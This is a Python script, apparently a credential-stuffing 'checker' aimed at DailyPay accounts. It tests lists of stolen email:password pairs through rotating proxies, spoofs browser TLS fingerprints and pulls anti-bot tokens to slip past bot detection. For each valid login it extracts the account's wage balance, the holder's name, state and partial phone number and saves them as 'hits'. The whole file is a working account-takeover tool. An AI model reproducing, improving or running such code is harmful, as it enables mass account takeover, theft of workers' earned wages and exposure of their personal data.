import functools, tls_client, traceback, datetime, aiofiles, logging, asyncio, random, httpx, uuid, json, time, sys, \
	ctypes, re, os

from config import *

##############################################################################
logging.basicConfig(format=u'%(filename)s [LINE:%(lineno)d] #%(levelname)-8s [%(asctime)s]  %(message)s',
					level=logging.INFO)
logging.getLogger('httpx').setLevel(logging.WARNING)

lock = asyncio.Lock()
stats = {'cpm': 0, 'checked': 0, 'remaining': 0, 'hits': 0, 'bans': 0, 'custom': 0, 'fails': 0, 'to_check': 0, 'errors': 0, 'last_update_time': time.time(), 'requests_count': 0}
##############################################################################
async def read_file(file_path: str, splitlines: bool = True):
	file_text = await (await aiofiles.open(file_path, 'r', encoding='utf-8')).read()
	return [x.strip() for x in list(set(file_text.splitlines())) if x.strip() != ''] if splitlines else file_text

async def write_to_file(file_path: str, text: str, mode: str = 'a'):
	file_text = await (await aiofiles.open(file_path, mode, encoding='utf-8')).write(text)

async def remove_line_from_file(file_path: str, line_to_remove: str):
	async with lock:
		async with aiofiles.open(file_path, mode='r') as f:
			lines = await f.readlines()

		lines = [line for line in lines if line.strip() != line_to_remove]

		async with aiofiles.open(file_path, mode='w') as f:
			await f.writelines(lines)

def update_cpm():
	current_time = time.time()
	elapsed_time = current_time - stats['last_update_time']
	stats['cpm'] = int(stats['requests_count'] // (elapsed_time / 60))
	if elapsed_time >= 60:
		stats['requests_count'] = 0
		stats['last_update_time'] = current_time


def update_title():
	text = f"Daily Pay | CPM: {stats['cpm']} | Checked: {stats['checked']} | Remaining: {stats['remaining']} | Hits: {stats['hits']} | Custom: {stats['custom']} | Fails: {stats['fails']} | Bans: {stats['bans']} | Errors: {stats['errors']}"
	ctypes.windll.kernel32.SetConsoleTitleW(text)

def update_stats(key: str, value: int, final: bool = False) -> object:
	if final and key in 'bans:hits:custom:fails':
		stats['checked'] += 1
		stats['remaining'] -= 1
	if key in 'hits:custom:fails':
		stats['requests_count'] += 1.4
	stats[key] += value
	update_cpm()
	update_title()



class ProxyManager:
	def __init__(self, proxy_path: str = None, proxies: list = []):
		if proxy_path and os.path.exists(proxy_path):
			self.proxies_to_check = [x.strip() for x in
									 list(set(open(proxy_path, 'r', encoding='utf-8').read().splitlines())) if
									 x.strip() != '']
		else:
			self.proxies_to_check = {proxy: 0 for proxy in proxies}
		self.proxies = {}

	def get_proxy(self, alr_formated: bool = True):
		try:
			min_usage_proxy = min(self.proxies, key=self.proxies.get)
			self.proxies[min_usage_proxy] += 1
			return {'http': min_usage_proxy, 'https': min_usage_proxy} if alr_formated else min_usage_proxy
		except:
			return None

	async def proxy_check_(self, proxy):
		if '@' in proxy:
			proxy_formated = proxy
		else:
			_proxy = proxy.split(':')
			proxy_formated = f'{_proxy[2]}:{_proxy[3]}@{_proxy[0]}:{_proxy[1]}'
		proxy_formated = f'{"http" if proxy_protocol["http"] else "socks5"}://{proxy_formated}'
		try:
			async with httpx.AsyncClient(proxies={'http://': proxy_formated, 'https://': proxy_formated}) as client:
				await client.get('http://ip.bablosoft.com')
			self.proxies[proxy_formated] = 0
		except:
			logging.info(f'[proxy_check] Invalid proxy: {proxy}')

	async def proxy_check(self):
		logging.info(f'Checking {len(self.proxies_to_check)} proxies')
		futures = []
		for proxy in list(self.proxies_to_check):
			futures.append(self.proxy_check_(proxy))
		await asyncio.gather(*futures)


class CheckerClient:
	def __init__(self, proxy_client: ProxyManager):
		self.proxy_client = proxy_client
		self.loop = asyncio.get_event_loop()
		self.aclient = httpx.AsyncClient(timeout=60)

	async def get_castle_token(self):
		while True:
			try:
				req = (await self.aclient.get('http://127.0.0.1:8000/token')).json()
				castle_token = req.get('token', None)
				user_agent = req.get('user-agent', None)
				if not castle_token:
					await asyncio.sleep(.5)
					continue
				return castle_token, user_agent
			except httpx.ReadTimeout:
				continue
			except httpx.ReadError:
				continue

	async def account_login(self, login: str, password: str, retry: bool = False):
		session = tls_client.Session(client_identifier="chrome112", random_tls_extension_order=True)
		session.proxies = self.proxy_client.get_proxy()
		try:
			(castle_token, csrf, success, last_error) = None, None, False, 'None'
			for idx in range(3):
				castle_token, user_agent = await self.get_castle_token()
				headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://app.dailypay.com', 'priority': 'u=0, i', 'referer': 'https://app.dailypay.com/login_password', 'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="112", "Google Chrome";v="112"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent}
				try:
					req = await self.loop.run_in_executor(None, functools.partial(session.get,
																				  'https://app.dailypay.com/login_password',
																				  headers=headers, timeout_seconds=5))
					csrf = req.text.split('meta name="csrf-token" content="')[1].split('"')[0]

					data = {"authenticity_token": csrf, "session[email]": login, "session[password]": password, "commit": "Continue", "castle_request_token": castle_token}
					req = await self.loop.run_in_executor(None,
														  functools.partial(session.post, 'https://app.dailypay.com/sessions',
																			data=data, headers=headers, allow_redirects=True,
																			timeout_seconds=10))
					if req.status_code == 403: continue
					success = True
					break
				except Exception as e:
					last_error = e
					continue
			if not csrf: raise IndexError
			elif not success: raise last_error

			if 'Incorrect access, please try again' in req.text:
				update_stats('fails', 1, True)
				return False
			elif req.status_code == 403:
				await write_to_file(accounts_path, f'{login}:{password}\n')
				update_stats('bans', 1, True)
				return False


			token = str(req.url).split('#access_token=')[1].split('&')[0]
			headers['Authorization'] = f'Bearer {token}'
			while True:
				try:
					req = await self.loop.run_in_executor(None, functools.partial(session.get,
																				  'https://employees-api.dailypay.com/employee_bff/v2/dashboard_information',
																				  headers={'accept': '*/*','accept-language': 'ru','authorization': f'Bearer {token}','origin': 'https://account.dailypay.com','priority': 'u=1, i','referer': 'https://account.dailypay.com/','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': user_agent}))
					if req.status_code == 404:
						await write_to_file(custom_path, f'{login}:{password} | new_profile = True\n')
						update_stats('custom', 1, True)
						print(f'[+] Custom: {login}:{password} | new_profile = True')
						return False
					# print(f'{login}:{password}', req, req.url)
					req_json = req.json()
					# print(req)
					# print(req.json())
					break
				except tls_client.exceptions.TLSClientExeption:
					continue
				except Exception as e:
					print(f'[-] Error ({e}): {login}:{password}')
					update_stats('errors', 1)
					await write_to_file(accounts_path, f'{login}:{password}\n')
					return False
			balance = round(req_json['availableBalanceCents'] / 100, 2)
			currency = req_json['currency']
			first_name = req_json['firstName']
			last_name = req_json['lastName']
			state = req_json['stateOfResidence']

			castle_token, user_agent = await self.get_castle_token()
			req = await self.loop.run_in_executor(None, functools.partial(session.post, 'https://employees-api.dailypay.com/graphql', headers={'accept': '*/*','accept-language': 'ru','authorization': f'Bearer {token}','content-type': 'application/json','credentials': 'include','origin': 'https://account.dailypay.com','priority': 'u=1, i','referer': 'https://account.dailypay.com/','sec-ch-ua': '"Chromium";v="126", "Not;A=Brand";v="24", "Google Chrome";v="126"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': user_agent,'x-app-bundle': 'com.DailyPay.DailyPay','x-app-version': 'undefined','x-castle-request-token': castle_token,'x-correlation-id': ''}, json={'operationName': 'testAuth','variables': {},'query': 'query testAuth {\n  employee {\n    id\n    __typename\n  }\n}\n'}))
			# print(f'graphql-{login}:{password}', req, req.headers)
			is_challenge = req.headers.get('X-Account-Challenged', True)
			phone = req.headers.get('X-Phone-Last-Four', None)
			# if not is_challenge:
			# 	await write_to_file(custom_path, f'{login}:{password}:{token}\n')
			# 	update_stats('custom', 1)

			text = f'{login}:{password} | balance = [{balance} {currency}] | firstName = {first_name} | lastName = {last_name} | state = {state.upper()} | PhoneNumber = {phone}'
			await write_to_file(hits_save_path, f'{text}\n')
			update_stats('hits', 1, True)
			print(f'[+] Valid: {text}')
			return True
		except tls_client.exceptions.TLSClientExeption:
			if retry:
				await write_to_file(accounts_path, f'{login}:{password}\n')
				update_stats('errors', 1)
				return False
			update_stats('bans', 1, True)
			return await self.account_login(login, password, True)
		except httpx.ConnectError:
			await write_to_file(accounts_path, f'{login}:{password}\n')
			update_stats('errors', 1)
			print('SERVER IS NOT STARTED!!!')
			return False
		except TypeError:
			await write_to_file(accounts_path, f'{login}:{password}\n')
			update_stats('errors', 1)
			return False
		except IndexError:
			if retry:
				await write_to_file(accounts_path, f'{login}:{password}\n')
				update_stats('errors', 1)
				return False
			update_stats('bans', 1, True)
			return await self.account_login(login, password, True)
		except Exception as e:
			await write_to_file(accounts_path, f'{login}:{password}\n')
			update_stats('errors', 1)
			print(f'[-] Error ({type(e)}): {e}')
			return False


async def main():
	proxy_client = ProxyManager(proxy_path=proxy_path)
	await proxy_client.proxy_check()
	parser_client = CheckerClient(proxy_client=proxy_client)
	accounts = await read_file(accounts_path)
	print(f'\n\nThreads: {max_concurrent_tasks}\nAccounts: {len(accounts)}\nValid proxy: {len(proxy_client.proxies)}\n\n\n')
	if len(proxy_client.proxies) == 0:
		exit('0 valid proxies')
	update_stats('remaining', len(accounts))

	queue = asyncio.Queue()
	semaphore = asyncio.Semaphore(max_concurrent_tasks)

	for acc in accounts:
		await queue.put(acc)

	async def login_task():
		while True:
			acc = await queue.get()
			try:
				login, password = acc.split(':')
			except:
				await remove_line_from_file(accounts_path, acc)
				queue.task_done()
				continue
			async with semaphore:
				await remove_line_from_file(accounts_path, acc)
				await parser_client.account_login(login, password)
			queue.task_done()

	tasks = [asyncio.create_task(login_task()) for _ in range(max_concurrent_tasks)]

	await queue.join()
	for task in tasks:
		task.cancel()

	await parser_client.aclient.aclose()

if __name__ == '__main__':
	try: asyncio.run(main())
	except KeyboardInterrupt: ...
	input(f"Daily Pay | CPM: {stats['cpm']} | Checked: {stats['checked']} | Remaining: {stats['remaining']} | Hits: {stats['hits']} | Custom: {stats['custom']} | Fails: {stats['fails']} | Bans: {stats['bans']} | Errors: {stats['errors']}")